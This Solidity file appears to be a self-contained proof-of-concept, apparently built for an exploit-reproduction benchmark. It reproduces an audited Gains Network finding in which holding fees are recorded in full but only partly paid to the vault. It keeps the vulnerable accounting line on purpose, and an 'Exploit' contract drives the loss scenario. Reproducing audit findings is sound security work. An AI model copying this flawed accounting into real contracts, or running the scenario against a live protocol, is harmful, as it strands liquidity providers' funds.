// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Gains Network finding 58128 (H-01):
// "Holding fees accounting discrepancy when collateral is less than fees".
//
// Real audited source (the vulnerable recording line is reproduced VERBATIM and
// marked @>; the finding is embedded/quoted from the audited repo):
//   protocol Gains Network (gTrade), Pashov Audit Group 2025-05-26
//   report   github.com/pashov/audits/blob/master/team/md/GainsNetwork-security-review_2025-05-26.md
//   fn       realizeHoldingFeesOnOpenTrade  (+ getTradeAvailableCollateralInDiamond)
//
// Root cause: when a trade's accrued holding fees (`holdingFeesCollateral`)
// EXCEED the collateral still available in the diamond, only the AVAILABLE
// portion is actually transferred to the vault
// (`amountSentToVaultCollateral = min(holdingFeesCollateral, available)`), but
// the FULL `holdingFeesCollateral` is recorded into
// `realizedTradingFeesCollateral` (the @> line). The vault therefore under-
// collects `holdingFeesCollateral - amountSentToVaultCollateral`. Once the
// trader tops the position up with fresh collateral, `getTradeAvailable-
// CollateralInDiamond` subtracts the inflated realized-fees figure, so the
// unsent fees are never delivered to the vault — they stay stuck in the
// diamond and the vault (LPs) permanently loses them.
//
// The vulnerable recording expression is byte-for-byte the audited source.
// Non-vulnerable dependencies (holding-fee accrual, the vault transfer helper,
// position storage, open/add-collateral/close plumbing) are faithful minimal
// doubles with real ERC20 transfers and real accounting — the discrepancy
// emerges from the verbatim code, it is not asserted.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Faithful minimal ERC20 double for the trade collateral token.
contract MiniToken {
    string public name = "Gains Collateral";
    string public symbol = "gWETH";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Marker token: the vault's permanent loss (unsent, stuck fees) is minted
///      to SINK on this token as the quantified harm signal (no attacker profit
///      — this is a protocol/vault loss-of-funds finding).
contract MarkerToken {
    string public name = "Gains Vault Loss Marker";
    string public symbol = "GNS-LOSS";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

/// @dev The gTrade vault (liquidity providers). Fees are transferred here.
contract Vault {}

/// @dev Faithful reproduction of the Gains diamond-storage pattern: both the
///      diamond and the `TradingCommonUtils` library read the same struct at a
///      fixed slot, so the verbatim `TradingCommonUtils.transferFeeToVault(...)`
///      call site can resolve the collateral token and the vault.
library Store {
    bytes32 internal constant SLOT = keccak256("gains.poc.holding-fees.store");

    struct Data {
        MiniToken token;
        address vault;
    }

    function get() internal pure returns (Data storage d) {
        bytes32 s = SLOT;
        assembly {
            d.slot := s
        }
    }
}

/// @dev Faithful double of the Gains fee-transfer helper. Runs inline in the
///      diamond context (internal library), so `address(this)` is the diamond
///      and `token.transfer(vault, amount)` moves collateral diamond -> vault.
library TradingCommonUtils {
    function transferFeeToVault(uint8 /*collateralIndex*/, uint256 amountCollateral, address /*user*/) internal {
        Store.Data storage s = Store.get();
        s.token.transfer(s.vault, amountCollateral);
    }
}

/// @dev Minimal faithful shape of the Gains trading storage types.
interface ITradingStorage {
    struct Trade {
        address user; // trade owner
        uint32 index; // per-trader trade index
        uint8 collateralIndex; // collateral asset id
        uint24 leverage; // position leverage (plain multiplier in this double)
        uint120 collateralAmount; // collateral locked for the trade
        // (remaining Trade fields omitted from this faithful minimal reproduction)
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — the holding-fee realization + available-collateral
// accounting is reproduced from the audited Gains source; the recording line
// is VERBATIM and marked @>.
// ─────────────────────────────────────────────────────────────────────────────
contract GNSTrading {
    struct TradeFeesData {
        uint128 realizedTradingFeesCollateral;
        uint128 manuallyRealizedNegativePnlCollateral;
        // (remaining TradeFeesData fields omitted)
    }

    struct HoldingFees {
        uint256 totalFeeCollateral;
    }

    uint256 internal constant PRECISION = 1e18;

    // trades[user][index] and per-trade fee accounting
    mapping(address => mapping(uint32 => ITradingStorage.Trade)) internal trades;
    mapping(address => mapping(uint32 => TradeFeesData)) internal _tradeFeesData;

    // faithful holding-fee accrual: a global rate index; each trade snapshots it
    // at open, and pending fees scale with position size (collateral * leverage).
    uint256 public holdingFeeIndex;
    mapping(address => mapping(uint32 => uint256)) internal initialHoldingFeeIndex;

    constructor(MiniToken token_, address vault_) {
        Store.Data storage s = Store.get();
        s.token = token_;
        s.vault = vault_;
    }

    function realizedTradingFeesCollateralOf(address user_, uint32 index_) external view returns (uint128) {
        return _tradeFeesData[user_][index_].realizedTradingFeesCollateral;
    }

    // ── faithful non-vulnerable plumbing ──

    /// @notice Open a leveraged trade; locks `collateralAmount` in the diamond.
    function openTrade(uint32 _index, uint24 _leverage, uint120 _collateralAmount) external {
        Store.Data storage s = Store.get();
        s.token.transferFrom(msg.sender, address(this), _collateralAmount);
        trades[msg.sender][_index] = ITradingStorage.Trade({
            user: msg.sender,
            index: _index,
            collateralIndex: 1,
            leverage: _leverage,
            collateralAmount: _collateralAmount
        });
        initialHoldingFeeIndex[msg.sender][_index] = holdingFeeIndex;
    }

    /// @notice Faithful holding-fee accrual: the global rate index advances over
    ///         time (keeper/permissionless). Larger positions accrue faster.
    function accrueHoldingFees(uint256 _indexDelta) external {
        holdingFeeIndex += _indexDelta;
    }

    /// @notice Pending holding fees for a trade, in collateral terms. Faithful:
    ///         scales with position size (collateral * leverage) and elapsed
    ///         rate — this is why high leverage lets fees exceed collateral.
    function _pendingHoldingFeesCollateral(ITradingStorage.Trade memory trade) internal view returns (uint256) {
        uint256 positionSizeCollateral = uint256(trade.collateralAmount) * uint256(trade.leverage);
        uint256 delta = holdingFeeIndex - initialHoldingFeeIndex[trade.user][trade.index];
        return (positionSizeCollateral * delta) / PRECISION;
    }

    /// @notice Trader adds collateral to an open position.
    function increaseCollateral(uint32 _index, uint120 _amount) external {
        Store.Data storage s = Store.get();
        s.token.transferFrom(msg.sender, address(this), _amount);
        trades[msg.sender][_index].collateralAmount += _amount;
    }

    /// @notice Close: returns the collateral still available in the diamond.
    function closeTrade(uint32 _index) external returns (uint256 returnedToTrader) {
        Store.Data storage s = Store.get();
        ITradingStorage.Trade memory trade = trades[msg.sender][_index];
        returnedToTrader = getTradeAvailableCollateralInDiamond(trade);
        trades[msg.sender][_index].collateralAmount = 0;
        s.token.transfer(msg.sender, returnedToTrader);
    }

    // ── VERBATIM audited accounting ──

    /// @notice Realize a trade's accrued holding fees on the open position.
    ///         The transfer-to-vault is capped to the collateral available, but
    ///         the FULL fee is recorded as realized (the marked line) — the bug.
    function realizeHoldingFeesOnOpenTrade(address _trader, uint32 _index, uint64 _currentPairPrice) external {
        ITradingStorage.Trade memory trade = trades[_trader][_index];
        TradeFeesData storage tradeFeesData = _tradeFeesData[_trader][_index];

        HoldingFees memory holdingFees = HoldingFees({totalFeeCollateral: _pendingHoldingFeesCollateral(trade)});
        uint256 holdingFeesCollateral = holdingFees.totalFeeCollateral;

        uint256 availableCollateralInDiamond = getTradeAvailableCollateralInDiamond(trade);

        uint256 amountSentToVaultCollateral;

        if (holdingFees.totalFeeCollateral > 0) {

            if (availableCollateralInDiamond > 0) {
                amountSentToVaultCollateral = holdingFeesCollateral > availableCollateralInDiamond
                    ? availableCollateralInDiamond
                    : holdingFeesCollateral;

                TradingCommonUtils.transferFeeToVault(trade.collateralIndex, amountSentToVaultCollateral, trade.user);
            }

            uint128 newRealizedTradingFeesCollateral = tradeFeesData.realizedTradingFeesCollateral +
                uint128(holdingFeesCollateral); // @> VULN: records the FULL holdingFeesCollateral as realized even though only the capped amountSentToVaultCollateral was transferred to the vault -> vault under-collects (holdingFeesCollateral - amountSentToVaultCollateral)
            tradeFeesData.realizedTradingFeesCollateral = newRealizedTradingFeesCollateral;

            // settle the accrual so realized fees are not double-counted (faithful)
            initialHoldingFeeIndex[_trader][_index] = holdingFeeIndex;
        }

        _currentPairPrice; // unused in this faithful minimal reproduction
    }

    /// @notice Available collateral still held by the diamond for a trade.
    ///         Subtracts the (inflated) realized fees — VERBATIM body.
    function getTradeAvailableCollateralInDiamond(ITradingStorage.Trade memory _trade) public view returns (uint256) {
        TradeFeesData memory tradeFeesData = _tradeFeesData[_trade.user][_trade.index];
        uint256 realizedTradingFeesCollateral = tradeFeesData.realizedTradingFeesCollateral;
        uint256 manuallyRealizedNegativePnlCollateral = tradeFeesData.manuallyRealizedNegativePnlCollateral;

        int256 availableCollateralInDiamondRaw = int256(uint256(_trade.collateralAmount)) -
            int256(realizedTradingFeesCollateral) -
            int256(manuallyRealizedNegativePnlCollateral);

        return availableCollateralInDiamondRaw > 0 ? uint256(availableCollateralInDiamondRaw) : 0;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: reproduces the finding's worked scenario. A 500x position of
// 1 ETH collateral accrues 1.5 ETH of holding fees; only 1 ETH is sent to the
// vault but 1.5 ETH is recorded as realized. The trader adds 1 ETH more, then
// closes: the 0.5 ETH of unsent fees is never delivered to the vault and stays
// stuck in the diamond — the vault permanently loses 0.5 ETH.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    MiniToken public collateral; // child nonce 1
    Vault public vault; // child nonce 2
    GNSTrading public gns; // child nonce 3 (VULN)
    MarkerToken public marker; // child nonce 4 (harm marker minted to SINK)

    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    uint120 internal constant C0 = 1 ether; // initial collateral
    uint24 internal constant LEV = 500; // 500x leverage
    uint256 internal constant INDEX_DELTA = 3e15; // accrues fees to 1.5 ETH (> collateral)
    uint120 internal constant ADDED = 1 ether; // collateral topped up later
    uint32 internal constant TRADE_INDEX = 0;

    uint256 public vaultReceived; // collateral actually transferred to the vault
    uint256 public recordedRealized; // fees the diamond recorded as realized
    uint256 public shortfall; // recorded - actually sent (vault under-collection)
    uint256 public stuckInDiamond; // unsent fees left stranded in the diamond
    uint256 public traderRefund; // collateral returned to the trader on close

    constructor() {
        collateral = new MiniToken(); // nonce 1
        vault = new Vault(); // nonce 2
        gns = new GNSTrading(collateral, address(vault)); // nonce 3 (VULN)
        marker = new MarkerToken(); // nonce 4
    }

    function run() external {
        // fund the trader (this contract) with initial + top-up collateral
        collateral.mint(address(this), uint256(C0) + uint256(ADDED));
        collateral.approve(address(gns), type(uint256).max);

        // 1) open a 500x trade with 1 ETH collateral (position size = 500 ETH)
        gns.openTrade(TRADE_INDEX, LEV, C0);

        // 2) holding fees accrue over time to 1.5 ETH (> the 1 ETH collateral)
        gns.accrueHoldingFees(INDEX_DELTA);

        // 3) realize fees: only the 1 ETH available is sent to the vault, but the
        //    full 1.5 ETH is recorded as realized (the bug)
        gns.realizeHoldingFeesOnOpenTrade(address(this), TRADE_INDEX, 0);

        vaultReceived = collateral.balanceOf(address(vault));
        recordedRealized = gns.realizedTradingFeesCollateralOf(address(this), TRADE_INDEX);

        // 4) trader tops up 1 ETH more collateral (now enough to cover the unsent
        //    0.5 ETH — a correct implementation would forward it to the vault)
        gns.increaseCollateral(TRADE_INDEX, ADDED);

        // 5) close: available = 2 - 1.5 = 0.5 ETH returned to the trader; the 0.5
        //    ETH of recorded-but-never-sent fees stays stuck in the diamond
        traderRefund = gns.closeTrade(TRADE_INDEX);

        stuckInDiamond = collateral.balanceOf(address(gns));
        shortfall = recordedRealized - vaultReceived;

        // HARM: the vault under-collected exactly the amount stranded in the diamond
        require(recordedRealized == 1.5 ether, "unexpected recorded realized fees");
        require(vaultReceived == 1 ether, "unexpected vault receipt");
        require(shortfall == 0.5 ether, "no accounting discrepancy");
        require(stuckInDiamond == shortfall, "stuck funds != vault shortfall");
        require(traderRefund == 0.5 ether, "unexpected trader refund");

        // quantify the vault's permanent loss for the profit pipeline (SINK)
        marker.mint(SINK, shortfall);
        require(marker.balanceOf(SINK) == 0.5 ether, "harm not materialized");
    }
}
